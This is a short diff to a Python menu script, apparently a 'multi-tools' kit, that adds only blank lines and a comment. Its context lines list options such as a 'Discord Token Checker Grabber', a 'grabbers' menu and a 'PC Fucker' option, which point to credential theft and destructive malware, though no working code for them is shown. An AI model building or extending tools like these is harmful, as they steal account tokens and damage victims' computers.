@@ -48,6 +48,7 @@ def additional():
           [3]Anonfiles link Gen
           [0]Back
           """)
+    
     USER_OPTION3 = input(bcolors.OKBLUE +    "[>] ")
     if USER_OPTION3 == "1":
         clearcmd()
@@ -83,6 +84,7 @@ def grabbers():
   [6] Discord Token Checker Grabber
   [0] Back
   """)
+    
   USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
   if USER_OPTION2 == "1":
     clearcmd()
@@ -128,6 +130,7 @@ def zyzz():
     [5] PC Fucker (will fuck ur pc)
     [6] Credits
     """)
+    
   USER_OPTION = input(bcolors.OKBLUE +    "[>] ")
   if USER_OPTION == "1":
     clearcmd()
@@ -164,3 +167,4 @@ zyzz()
 #snee is king
 #github.com/itssnee
 #github.com/itssnee/multi-tools
+#skids are haram!!!!
